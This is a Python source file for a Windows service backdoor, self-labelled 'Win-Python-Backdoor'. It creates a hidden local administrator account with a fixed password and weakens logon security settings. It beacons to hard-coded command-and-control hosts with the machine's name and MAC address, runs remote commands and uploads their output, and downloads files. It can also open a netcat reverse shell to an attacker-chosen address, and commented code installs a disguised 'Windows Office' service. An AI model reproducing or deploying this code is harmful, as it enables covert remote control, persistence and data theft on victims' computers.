import win32serviceutil
import win32service
import win32event
import socket
import servicemanager
import threading
import asyncore
import sched,time
import sys,ctypes
import os

#import Crypto
#import ecdsa
#import paramiko
import subprocess
import http.client
import requests
#import urllib3
import urllib.request
#import pycurl
from os import path, access, R_OK
from uuid import getnode as get_mac
from subprocess import Popen
#from fake_useragent import UserAgent

#import logging
#from logging.handlers import RotatingFileHandler

#import win32ui, win32gui, win32com, pythoncom, win32con
#from win32com.client import Dispatch
#from time import sleep
#import _winreg
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False






#Win-Python-Backdoor

#pip install requests
#pip install fake_useragent
#scripts\pip3 install pyinstaller
#cd %USERPROFILE%\AppData\Local\Programs\Python\Python37

#copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wofficeie13.py" %USERPROFILE%\AppData\Local\Programs\Python\Python37

#scripts\pyinstaller  -F --hidden-import=win32timezone  wofficeie13.py
#scripts\pyinstaller --manifest build\wofficeie13\wofficeie13.exe.manifest --uac-admin -F --hidden-import=win32timezone  wofficeie13.py
#copy /y %USERPROFILE%\AppData\Local\Programs\Python\Python37\dist\wofficeie13.exe %USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\wup.exe
def Init():
    #os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
    #os.environ["REQUESTS_CA_BUNDLE"] = os.path.join(os.getcwd(), "certifi", "cacert.pem")
    #certifi.core.where=swin+"/certifi/cacert.pem"
    #requests.utils.DEFAULT_CA_BUNDLE_PATH=swin+"/certifi/cacert.pem"
    #requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
#os.system("net.exe user Administrator /active:yes")
    os.system("net.exe user asp Qwerty12! /add")
    os.system("net.exe localgroup administrators asp /add")
    os.system("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f")
    os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
    os.system("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false")
    os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
    #os.system("netsh advfirewall set allprofiles state off")
##                            if not os.path.exists('c:\\windows\\wup.exe'):
##                                    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
##                                    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
##                                    subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
    if not os.path.exists('c:\\windows\\syswow64'):
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f')
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f')
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f')
    else:
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f /reg:64')
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f /reg:64')
        #os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64')
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64')
    
    
    #os.system("net.exe user Administrator Qwerty12")
    os.system("net.exe user asp Qwerty12!")
    os.system("net.exe user asp /active:yes")
    sinit='1'


def get_macaddress(host='localhost'):
    """ Returns the MAC address of a network host, requires >= WIN2K. """
    # http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/347812
    
    import socket
    import struct
 
    # Check for api availability
    try:
        SendARP = ctypes.windll.Iphlpapi.SendARP
    except:
        raise NotImplementedError('Usage only on Windows 2000 and above')
 
    # Doesn't work with loopbacks, but let's try and help.
    if host == '127.0.0.1' or host.lower() == 'localhost':
        host = socket.gethostname()
 
    # gethostbyname blocks, so use it wisely.
    try:
        inetaddr = ctypes.windll.wsock32.inet_addr(host)
        if inetaddr in (0, -1):
            raise Exception
    except:
        hostip = socket.gethostbyname(host)
        inetaddr = ctypes.windll.wsock32.inet_addr(hostip)
 
    buffer = ctypes.c_buffer(6)
    addlen = ctypes.c_ulong(ctypes.sizeof(buffer))
    if SendARP(inetaddr, 0, ctypes.byref(buffer), ctypes.byref(addlen)) != 0:
        raise WindowsError('Retreival of mac address(%s) - failed' % host)
 
    # Convert binary data into a string.
    macaddr = ''
    for intval in struct.unpack('BBBBBB', buffer):
        if intval > 15:
            replacestr = '0x'
        else:
            replacestr = 'x'
        if macaddr != '':
            #macaddr = ':'.join([macaddr, hex(intval).replace(replacestr, '')])
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
        else:
            macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
 
    return macaddr.upper()

#try:
#    CREATE_NO_WINDOW = 0x08000000
#    swin=os.getenv('windir')
#    suser=os.getenv('USERPROFILE')
#    if not os.path.exists('c:\\windows\\wup.exe'):
        
##    f = urllib2.urlopen("http://certificates.ddns.net/wofficeie.exe")
##    with open(swin+'\\wup.exe',"wb") as code:
##        code.write(f.read())
    #os.system('powershell -Command Invoke-WebRequest -Uri "http://54.218.80.188/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
    #while not os.path.exists('c:\\windows\\wup.exe'):
    #    time.sleep(5)
    #subprocess.call("move "+swin+'\\wofficeie.exe '+swin+'\\wup.exe', creationflags=0x08000000)
    #subprocess.call("cmd /c copy /y "+os.getcwd()+"\\wofficeie.exe " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
    
    #subprocess.call("TASKKILL /F /IM wup.exe", creationflags=CREATE_NO_WINDOW)
    #time.sleep(1)
    #subprocess.call("cmd /c del "+swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
    #time.sleep(1)
#        subprocess.call("cmd /c copy /y "+sys.argv[0]+" " +swin+"\\wup.exe", creationflags=CREATE_NO_WINDOW)
#        subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
        #print("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest")
#        subprocess.call("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest /F", creationflags=CREATE_NO_WINDOW)
        #subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
#        subprocess.call("netsh advfirewall firewall add rule name=\"Open Port 445\" dir=in action=allow protocol=TCP localport=445", creationflags=CREATE_NO_WINDOW)
#        Init()
#        subprocess.call("net start wup", creationflags=0x08000000)
        #os.system("netsh advfirewall set allprofiles state off")
    #os.system("net.exe user Administrator /active:yes")
    #os.system("net.exe user Administrator Qwerty12")
    #myloop()
#except Exception as e:
#    print (str(e))
#class AppServerSvc (win32serviceutil.ServiceFramework):
#    _svc_name_ = "wofficeie"
#    _svc_display_name_ = "Windows Office"

#    def __init__(self,args):
#        win32serviceutil.ServiceFramework.__init__(self,args)
#        self.hWaitStop = win32event.CreateEvent(None,0,0,None)

#    def SvcStop(self):
#        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
#        win32event.SetEvent(self.hWaitStop)
#    def SvcDoRun(self):
#        #print getProxy()        
#        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
        
#        Init()
        
        #self.stopping = False

        #while not self.stopping:
        
#        while True:
#            try:
#               myloop() 
#               time.sleep(60)
#            except Exception as e:
#               print (str(e)) 
#               time.sleep(60)
#               myloop()      


       

def myloop():
    #threading.Timer(10.0, myloop).start() # called every minute   
    sinit='0'
    #sites = ["paner.altervista.org", "verifiche.ddns.net"]
    #ua = UserAgent()
    #header = {'User-Agent':str(ua.chrome)}
    sites = ["paner.altervista.org"]#, mainsite.text]
    header = {'User-Agent': 'Mozilla/5.0'}
    try:
      ip=socket.gethostbyname('config01.homepc.it')
      mainsite = requests.get("http://"+ip+"/site.txt", headers=header)
      for mysite in mainsite.text.split(","):
         #print socket.gethostbyname(mysite)
         sites.append(socket.gethostbyname(mysite))
      #sites.extend(mainsite.text.split(",") )
    except Exception as e:
      print (str(e))
    #p = Popen("curl -L -A 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36' https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF -o "+os.getenv('TEMP')+"\\sites.txt",shell=True)
    #time.sleep(5)
    #text_file = open(os.getenv('TEMP')+"\\sites.txt", "r")    
    #text_file_content=text_file.read()
    #sites.extend(text_file_content.split(",") )
    #text_file.close()
    #print mainsite.text
    
    
    #site="paner.altervista.org"
    site1="paner.altervista.org"
    site2="52.26.124.145"
    site3="certificates.ddns.net"
    #os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
    #os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")


    
    
    
    #print(header)
    
    
#    log_formatter = logging.Formatter('%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

#    logFile = os.getenv('windir')+"\\wup.log"

#    my_handler = RotatingFileHandler(logFile, mode='a', maxBytes=1*1024, 
#                                 backupCount=2, encoding=None, delay=0)
#    my_handler.setFormatter(log_formatter)
#    my_handler.setLevel(logging.INFO)

#    app_log = logging.getLogger('root')
#    app_log.setLevel(logging.INFO)

#    app_log.addHandler(my_handler)


    #app_log.info("data")
    
    
    #logging.basicConfig(filename=os.getenv('windir')+"\\wup.log",level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
#    app_log.info('Start')
    
    

    
    
#while True:

    
    for site in sites:
      try:
              #app_log.info('Step')
              #if sinit == '0':
              #        Init()
                      
              #httpServ = httplib.HTTPConnection(site, 80)
              #httpServ.connect()
              
              mymac = get_mac()
              #smacaddress = get_macaddress('localhost')
              smacaddress=str(get_mac())
              sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
              sTime=time.ctime(os.path.getmtime(os.getenv('windir')+"\\wup.exe"))
              sTime=sTime.replace(" ","_")
              #opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS4, '52.26.124.145', 8080))
              #response = opener.open("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime).read()
              #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)#+"&dump=aaaaa")
              #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)
              #response = httpServ.getresponse()
              url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
              response = requests.get(url, headers=header)
              #sresponse=response.read()
              if response.status_code == 200:#httplib.OK:
              #if sresponse!= '':
                      print ("Output from HTML request")
                      sresponse = response.text
                      ifind=sresponse.find('ip=')
                      sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                      ifind=sresponse.find('port=')
                      sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                      ifind=sresponse.find('kill=')
                      skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                      ifind=sresponse.find('iout=')
                      sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                      ifind=sresponse.find('exec=')
                      sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                      ifind=sresponse.find('cmd=')
                      scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                      print (skill)
              else:
#                      logging.info('Not 200')
                      #myloop()
                      if site == site1:
                          site=site2
                      elif site == site2:
                          site=site3
                      elif site == site3:
                          site=site1
                      #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime)
                      #response = httpServ.getresponse()
                      url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&wup="+sTime
                      response = requests.get(url, headers=header)
                      #if sresponse!= '':
                      if response.status_code == 200:#httplib.OK:
                          print ("Output from HTML request")
                          sresponse = response.text
                          ifind=sresponse.find('ip=')
                          sip = sresponse[ifind+3:sresponse.find('||',ifind)]
                          ifind=sresponse.find('port=')
                          sport = sresponse[ifind+5:sresponse.find('||',ifind)]
                          ifind=sresponse.find('kill=')
                          skill = sresponse[ifind+5:sresponse.find('||',ifind)]
                          ifind=sresponse.find('iout=')
                          sout = sresponse[ifind+5:sresponse.find('||',ifind)]
                          ifind=sresponse.find('exec=')
                          sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
                          ifind=sresponse.find('cmd=')
                          scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                          print (skill)
                      
              #httpServ.close()
              if sexec == '1':
                      sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
                      try:
                          if sout == '1':
                              sdump=subprocess.check_output(scmd,stderr=subprocess.STDOUT, shell=True)
      ##                                    process=subprocess.Popen(scmd,stdout=subprocess.PIPE,stderr=subprocess.STDOUT, shell=True)
      ##                                    p = Popen(scmd,shell=True)
      ##                                    returncode = process.wait()
      ##                                    print('return code'.format(returncode))
      ##                                    sdump=process.stdout.read()
                              text_file = open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, "w")
                              text_file.write(sdump)
                              text_file.close()
                              files = {'userfile': open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, 'rb')}
                              r = requests.post('http://' + site +'/upload.php',files=files)     
                              #if len(sdump)<2006:
                              #sdump = sdump.replace("\'", "")
                              #sdump = sdump.replace("\\", "\\\\")
                              sdump = sdump.replace("\r\n", "<br>")
                              #sdump = sdump.replace("\n", "<br>")
                              #sdump = sdump.replace("\r", "<br>")
                              sdump = sdump.replace(" ", "%20")
                              #sdump = sdump[ 0 : 2005]
                              #httpServ = httplib.HTTPConnection(site, 80)
                              #httpServ.connect()
                              #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                              #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump)
                              #response = httpServ.getresponse()
                              url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&dump="+sdump
                              response = requests.get(url, headers=header)
                              #httpServ.close()
                                                                 
                          else:
                              igetfile=scmd.find('getfile')
                              ifile=scmd.rfind('/')
                              if igetfile==0:
                                  geturl =scmd[8:len(scmd)]
                                  
                                  sfiledest= scmd[ifile+1:len(scmd)]
                                  
                                  #f = urllib2.urlopen(geturl)
                                  #with open(swin+'\\'+ sfiledest, "wb") as code:
                                  #    code.write(f.read())
                                  with urllib.request.urlopen(geturl) as response, open(swin+'\\'+ sfiledest, 'wb') as out_file:
                                      data = response.read() # a `bytes` object
                                      out_file.write(data) 
                              else:
                                  p = Popen(scmd,shell=True)
                          #print r.text
                      except Exception as e:
                          print (str(e))
                          #myloop()
                      #httpServ = httplib.HTTPConnection(site, 80)
                      #httpServ.connect()
                      #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                      #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0")
                      #response = httpServ.getresponse()
                      url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&exec=0"
                      response = requests.get(url, headers=header)
                      #httpServ.close()
              if skill == '0':
                      try:
                          if not os.path.exists('c:\windows\syswow64'):
                                  p = Popen("nc.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                  #os.system("nc.exe -e cmd.exe "+sip+" "+sport)
                          else:
                                  p = Popen("nc64.exe -e cmd.exe "+sip+" "+sport,shell=True)
                                  #os.system("nc64.exe -e cmd.exe "+sip+" "+sport)
                      except Exception as e:
                          print (str(e))
                          #myloop()
                      #httpServ = httplib.HTTPConnection(site, 80)
                      #httpServ.connect()
                      #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                      #httpServ.request('GET', "/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1")
                      #response = httpServ.getresponse()
                      url = "http://"+site+"/svc/wup.php?pc="+sCOMPUTERNAME+"&kill=1"
                      response = requests.get(url, headers=header)
                      #httpServ.close()
                      
      ##                                        client = paramiko.SSHClient()                                        
      ##                                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      ##                                        #label .myLabel
      ##                                        #try:
      ##                                        #sip = '184.72.89.74'
      ##                                        try:
      ##                                            client.connect(sip, username='root', password='toor',port=int(sport))
      ##                                            chan = client.get_transport().open_session()
      ##                                            chan.send('Hey i am connected :) ')
      ##                                            print chan.recv(1024)
      ##                                            while True:
      ##                                                command = chan.recv(1024)
      ##                                                print str(len(command))
      ##                                                print command
      ##                                                if command == 'exit' or len(command) == 0:
      ##                                                    
      ##                                                    client.close()
      ##                                                    break
      ##                                                try:
      ##                                                    CMD = subprocess.check_output(command, shell=True)
      ##                                                    chan.send(CMD)
      ##                                                except Exception as e:
      ##                                                    chan.send(str(e))
      ##                                        except Exception as e:
      ##                                            print (str(e))
              site=site1
      except Exception as e:
#              app_log.info('Exception %s',str(e))
              print (str(e))
              #print e.errno
              #if e.errno == 11001: 
              time.sleep(10) 
              #myloop()                   
              if site == site1:
                  site=site2
              elif site == site2:
                  site=site3
              elif site == site3:
                  site=site1
              
#time.sleep(10)
class TestService(win32serviceutil.ServiceFramework):
    _svc_name_ = "TestService"
    _svc_display_name_ = "Test Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        rc = None
#        subprocess.Popen("cmd /c net.exe user asp Qwerty12! /add")
        while rc != win32event.WAIT_OBJECT_0:
            with open('C:\\TestService.log', 'a') as f:
                f.write('test service running...\n')
            
            try:               
               myloop() 
               time.sleep(60)
            except Exception as e:
               print (str(e)) 
               time.sleep(60)
               myloop() 
            rc = win32event.WaitForSingleObject(self.hWaitStop, 5000)
            


if __name__ == '__main__':
    
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(TestService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(TestService)



